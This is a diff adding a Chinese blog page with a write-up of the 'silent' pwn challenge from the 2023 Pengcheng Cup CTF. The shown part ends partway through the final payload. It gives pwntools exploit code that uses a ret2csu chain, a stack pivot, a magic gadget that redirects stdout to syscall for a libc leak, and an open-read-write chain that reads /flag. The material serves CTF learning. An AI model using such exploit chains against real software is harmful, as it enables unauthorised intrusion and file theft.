@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>鹏城杯2023WriteUp-Pwn - 好好学习</title><meta name="author" content="alextang">
+<meta name="author-link" content="">
+<meta name="description" content="这个鹏城杯才是我真正意义上的第一场CTF。虽然之前有过校赛，但是校赛上简单题非常多，还是可以混混分的。这场应该算是像样的CTF（甚至还有点恶心），直接给我虐昏了。只能赛后补补题了。
+而且比赛当天感冒了，当然这不是关键问题。我学的内容还是比较少的，先把能补的补了，持续更新。" /><meta name="keywords" content='CTF, Pwn, WriteUp' />
+  <meta itemprop="name" content="鹏城杯2023WriteUp-Pwn">
+  <meta itemprop="description" content="这个鹏城杯才是我真正意义上的第一场CTF。虽然之前有过校赛，但是校赛上简单题非常多，还是可以混混分的。这场应该算是像样的CTF（甚至还有点恶心），直接给我虐昏了。只能赛后补补题了。
+而且比赛当天感冒了，当然这不是关键问题。我学的内容还是比较少的，先把能补的补了，持续更新。">
+  <meta itemprop="datePublished" content="2023-11-06T20:05:43+08:00">
+  <meta itemprop="dateModified" content="2023-11-06T20:05:43+08:00">
+  <meta itemprop="wordCount" content="2586">
+  <meta itemprop="keywords" content="CTF,Pwn,WriteUp"><meta property="og:url" content="https://alextang.top/articles/2023/11/pcb2023/">
+  <meta property="og:site_name" content="好好学习">
+  <meta property="og:title" content="鹏城杯2023WriteUp-Pwn">
+  <meta property="og:description" content="这个鹏城杯才是我真正意义上的第一场CTF。虽然之前有过校赛，但是校赛上简单题非常多，还是可以混混分的。这场应该算是像样的CTF（甚至还有点恶心），直接给我虐昏了。只能赛后补补题了。
+而且比赛当天感冒了，当然这不是关键问题。我学的内容还是比较少的，先把能补的补了，持续更新。">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-11-06T20:05:43+08:00">
+    <meta property="article:modified_time" content="2023-11-06T20:05:43+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="WriteUp">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="鹏城杯2023WriteUp-Pwn">
+  <meta name="twitter:description" content="这个鹏城杯才是我真正意义上的第一场CTF。虽然之前有过校赛，但是校赛上简单题非常多，还是可以混混分的。这场应该算是像样的CTF（甚至还有点恶心），直接给我虐昏了。只能赛后补补题了。
+而且比赛当天感冒了，当然这不是关键问题。我学的内容还是比较少的，先把能补的补了，持续更新。">
+      <meta name="twitter:site" content="@a1extang">
+<meta name="application-name" content="a1extang">
+<meta name="apple-mobile-web-app-title" content="a1extang"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://alextang.top/articles/2023/11/pcb2023/" /><link rel="prev" href="https://alextang.top/articles/2023/11/advancerop-ret2dlresolve/" /><link rel="next" href="https://alextang.top/articles/2023/11/fmt_str/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "鹏城杯2023WriteUp-Pwn",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/alextang.top\/articles\/2023\/11\/pcb2023\/"
+    },"genre": "posts","keywords": "CTF, Pwn, WriteUp","wordcount":  2586 ,
+    "url": "https:\/\/alextang.top\/articles\/2023\/11\/pcb2023\/","datePublished": "2023-11-06T20:05:43+08:00","dateModified": "2023-11-06T20:05:43+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "alextang"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                title="关于"
+                
+              ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  title="关于"
+                  
+                ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>鹏城杯2023WriteUp-Pwn</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=large 2x" sizes="auto" data-title="alextang" data-alt="alextang" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;alextang</span></span>
+          <span class="post-category">收录于 <a href="/categories/pwn/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pwn</a></span></div>
+      <div class="post-meta-line"><span title="发布于 2023-11-06 20:05:43"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2023-11-06">2023-11-06</time></span>&nbsp;<span title="更新于 2023-11-06 20:05:43"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2023-11-06">2023-11-06</time></span>&nbsp;<span title="2586 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 2600 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 6 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#silent">silent</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>这个鹏城杯才是我真正意义上的第一场CTF。虽然之前有过校赛，但是校赛上简单题非常多，还是可以混混分的。这场应该算是像样的CTF（甚至还有点恶心），直接给我虐昏了。只能赛后补补题了。</p>
+<p>而且比赛当天感冒了，当然这不是关键问题。我学的内容还是比较少的，先把能补的补了，持续更新。</p>
+<h2 id="silent">silent</h2>
+<p>唯一有希望做出来的题，看完题解后发现是唯一没希望做出来的题。</p>
+<p>首先谈谈思路：由于开启了seccomp禁掉了execve，所以one_gadget直接被毙掉。反编译发现程序只有输入（read函数），没有输出，system更是无从谈起。但是输出是必须的。没有输出就没有地址，没有地址就拿不到libc，没有libc什么函数都用不了（这题显然应该是orw拿flag）。于是这里我们要谈一个叫magic gadget的东西。</p>
+<p>我们可以在程序中发现一个叫stdout的东西，具体来说叫：<code>stdout@@GLIBC_2_2_5</code>。实际上它存在于libc中，是libc中的一个symbol。我们知道在进程中libc函数的相对位置是固定的，那么我们就可以通过相对的偏移将stdout所在的位置的地址改为其他libc函数，再call stdout的地址即可执行想要的函数。</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231106204727887.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231106204727887.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231106204727887.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231106204727887.png?size=large 2x" sizes="auto" data-title="image-20231106204727887" data-alt="image-20231106204727887" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>magic gadget就是通过寄存器做到任意修改内存地址的gadgets，它在ida中是找不到的，因为是通过错位的字节码来获得的。使用ROPgadget工具可以找到它的地址：</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary silent <span class="p">|</span> grep ret <span class="p">|</span> grep <span class="s1">&#39;\[rbp&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>即：<code>add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</code>这三条指令。我们仅需关注第一条指令：它会将rbp - 0x3d所代表的内存处的数值增加ebx。<code>rbp</code>和<code>ebx</code>是很容易控制的，因此可以实现任意内存地址的读写。</p>
+<p>根据大佬们的博客，掌握了上面的内容，下面的内容基本属于固定套路。为了泄露libc基地址，我们需要输出已知函数（read）的实际地址（GOT地址）。我们只需要将stdout偏移至syscall，然后控制rax为1，即可完成<code>write</code>的功能。</p>
+<p>如何控制rax为1？我们知道，当执行成功的时候，<code>write</code>和<code>read</code>的返回值分别是成功输出和读入的字节数，而返回值就存放在rax寄存器中。于是我们只需要read1个字节的数据到任意的地点即可完成对rax寄存器的控制。</p>
+<p>总结下，如果遇到可用函数很少的情况：</p>
+<ul>
+<li>找到存在于libc中的一个函数（通常是stdout），使用magic gadget偏移到syscall上。</li>
+<li>使用read函数控制rax为1，然后执行syscall泄露libc地址。</li>
+</ul>
+<p>那么再讨论实现的细节。由于溢出空间比较小（实际上是ret2csu所需要空间比较大），首先要做的是将之后的payload读取到bss区然后将栈迁移过去。这个非常简单，具体实现如下所示：</p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x48</span><span class="p">,</span>	<span class="c1"># 填充至retn address</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csu1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span>	<span class="c1"># 将payload读取到base_stage,地址可以任意选择</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csu2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">leave_ret</span>	<span class="c1"># 栈迁移到base_stage，这里减一个0x8是为了让rsp在leave后刚好在base_stage</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>csu的两段代码如下，可以在IDA中轻松的找到：</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">csu1</span> <span class="o">=</span> <span class="mh">0x40095A</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">pop     rbx
+</span></span></span><span class="line"><span class="cl"><span class="s1">pop     rbp
+</span></span></span><span class="line"><span class="cl"><span class="s1">pop     r12
+</span></span></span><span class="line"><span class="cl"><span class="s1">pop     r13
+</span></span></span><span class="line"><span class="cl"><span class="s1">pop     r14
+</span></span></span><span class="line"><span class="cl"><span class="s1">pop     r15
+</span></span></span><span class="line"><span class="cl"><span class="s1">retn
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">csu2</span> <span class="o">=</span> <span class="mh">0x400940</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov     rdx, r15
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov     rsi, r14
+</span></span></span><span class="line"><span class="cl"><span class="s1">mov     edi, r13d
+</span></span></span><span class="line"><span class="cl"><span class="s1">call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]
+</span></span></span><span class="line"><span class="cl"><span class="s1">add     rbx, 1
+</span></span></span><span class="line"><span class="cl"><span class="s1">cmp     rbp, rbx
+</span></span></span><span class="line"><span class="cl"><span class="s1">jnz     short loc_400940
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>接下来我们就使用magic gadget将stdout偏移为syscall。这里有个细节，为了加上一个负数，这里需要将负数写成补码，方法如下：</p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;syscall&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">27</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>为什么要加27呢？因为这个syscall执行前会有很多额外操作，实测会影响下面进程，于是这里直接偏移到<code>call syscall</code>这一条指令上来最为方便。另外，stdout在libc中的名称是<code>_IO_2_1_stdout_</code>!!!而且也有名叫stdout的symbol，千万不要弄混。这两者的区别尚不明确。</p>
+<p>接下来，我们使用read读取一个字节来控制rax，结束后将下一段payload读取到另外一个位置，再次栈迁移。这是因为我们要在当前的payload末尾放入一个<code>/flag</code>字符串为接下来orw做准备。如果接着这个栈的位置使用会有连续性上的问题。这里我比较懒，直接再开一个空间放下一个栈好了。</p>
+<div class="highlight" id="id-5"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csu1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">offset</span><span class="p">,</span> <span class="n">stdout</span> <span class="o">+</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>	<span class="c1"># stdout移动offset</span>
+</span></span><span class="line"><span class="cl">    <span class="n">magic</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csu1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(</span><span class="mh">0x800</span><span class="p">),</span> <span class="mh">0x1</span><span class="p">,</span>	<span class="c1"># 修改rax</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csu2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">stdout</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span>	<span class="c1"># 执行syscall -&gt; write</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csu2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mh">0x400</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span>	<span class="c1"># 将下一个payload读到base_stage + 0x400</span>
+</span></span><span class="line"><span class="cl">    <span class="n">csu2</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mh">0x400</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">leave_ret</span><span class="p">,</span>	<span class="c1"># 迁移</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;/flag</span><span class="se">\x00\x00\x00</span><span class="s1">&#39;</span> <span class="c1"># 字符串的位置在base_stage + 40 * 8</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>	<span class="c1"># 别忘了随便发</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就是泄露地址，然后计算orw三个函数的真实地址：</p>
+<div class="highlight" id="id-6"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># info(hex(libc_base))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">open_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;open&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">read_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">libc_base</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后就是orw的基本过程，这里<code>pop rsi</code>和<code>pop rdx</code>的gadgets在程序中找不到，只能去libc中找了。这里为什么不用ret2csu呢？因为用ret2csu中的call执行open函数会直接死掉，这里原因尚不明确，等知道了再来补。</p>
+<div class="highlight" id="id-7"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x400963</span>
+</span></span><span class="line"><span class="cl"><span class="n">rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2601f</span>
+</span></span><span class="line"><span class="cl"><span class="n">rdx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x142c92</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rdi</span><span class="p">,</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">40</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rsi</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">open_addr</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rdi</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rsi</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(),</span>	<span class="c1"># 地址随便填</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span>
